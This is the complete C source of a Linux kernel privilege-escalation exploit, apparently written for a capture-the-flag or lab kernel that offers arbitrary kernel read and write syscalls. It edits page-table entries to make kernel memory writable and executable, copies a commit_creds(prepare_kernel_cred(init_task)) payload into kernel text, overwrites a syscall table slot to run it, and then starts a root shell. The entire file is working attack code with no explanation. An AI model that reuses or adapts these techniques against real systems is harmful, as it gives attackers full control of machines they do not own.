// gcc exploit.c -masm=intel -fno-PIE -nostdlib/-static -no-pie -o exploit
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


uint64_t pwnread(uintptr_t addr);
int pwnwrite(uintptr_t addr, uint64_t val);
int getroot(void);

ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
size_t strlen(const char *s);
int puts(const char *s);
static void dump(void *buf, size_t size);

/* exploit */
#define __START_KERNEL_map	0xffffffff80000000
#define TEXT_BASE		0xffffffff81000000
#define OFFSET(addr)		((addr) - (TEXT_BASE))
#define ADDR(offset)		(kernel_base + (offset))
#define ADDR_IDT		0xfffffe0000000000

#define VADDR(paddr)	(vaddr_map_base + (paddr))
const uintptr_t vaddr_map_base		= 0xffff888000000000;
const uintptr_t paddr_pml4 		= 0x009c000;
const uintptr_t paddr_syscall_table	= 0x1a00240;

#define SYS_getroot 340

static void make_kpage_rwx(uintptr_t vaddr);
static int sys_get_root(void);

void _start(void){
	if(getroot()){
		uintptr_t vaddr_syscall_table 	= VADDR(paddr_syscall_table);
		uintptr_t vaddr_shellcode	= 0xffffffff81801000;

		make_kpage_rwx(vaddr_syscall_table);
		make_kpage_rwx(vaddr_shellcode);

		memcpy((void*)vaddr_shellcode, sys_get_root, (uintptr_t)memcpy-(uintptr_t)sys_get_root);
		((uintptr_t*)vaddr_syscall_table)[SYS_getroot] = vaddr_shellcode;

		getroot();
	}

	execve("/bin/sh", (char*[2]){"sh", NULL}, NULL);
	exit(-1);
}

static void make_kpage_rwx(uintptr_t vaddr){
	#define PAGETABLE_ENTRY_VADDR(paddr_table, bit) (VADDR(paddr_table)+sizeof(uint64_t)*(vaddr >> (bit) & ((1<<9)-1)))
	#define ENT_ATTR_RWX(entry)	(((entry) & ((1UL<<63)-1)) | 0b110)
	#define ENT_PADDR(entry)	((entry) & (((1UL<<36)-1)<<12))

	uint64_t pml4e = pwnread(PAGETABLE_ENTRY_VADDR(paddr_pml4, 39));
	pwnwrite(PAGETABLE_ENTRY_VADDR(paddr_pml4, 39), ENT_ATTR_RWX(pml4e));

	uintptr_t paddr_pdpt = ENT_PADDR(pml4e);
	uint64_t pdpte = pwnread(PAGETABLE_ENTRY_VADDR(paddr_pdpt, 30));
	pwnwrite(PAGETABLE_ENTRY_VADDR(paddr_pdpt, 30), ENT_ATTR_RWX(pdpte));
	if((pdpte >> 7) & 1) return;

	uintptr_t paddr_pd = ENT_PADDR(pdpte);
	uint64_t pde = pwnread(PAGETABLE_ENTRY_VADDR(paddr_pd, 21));
	pwnwrite(PAGETABLE_ENTRY_VADDR(paddr_pd, 21), ENT_ATTR_RWX(pde));
	if((pde >> 7) & 1) return;

	uintptr_t paddr_pt = ENT_PADDR(pde);
	uint64_t pte = pwnread(PAGETABLE_ENTRY_VADDR(paddr_pt, 12));
	pwnwrite(PAGETABLE_ENTRY_VADDR(paddr_pt, 12), ENT_ATTR_RWX(pte));
}

static int sys_get_root(void){
	struct task_struct *init_task					= (void*)0xffffffff81c25600;
	struct cred *(*prepare_kernel_cred)(struct task_struct *daemon) = (void*)0xffffffff8105aac0;
	int (*commit_creds)(struct cred *new) 				= (void*)0xffffffff8105a7d0;

	return commit_creds(prepare_kernel_cred(init_task));
}

/* utils */
void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

asm(
"pwnread:\n"
"mov rax, 451\n"
"syscall\n"
"ret\n"

"pwnwrite:\n"
"mov rax, 452\n"
"syscall\n"
"ret\n"

"getroot:\n"
"mov rax, 340\n"
"syscall\n"
"ret\n"

"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);

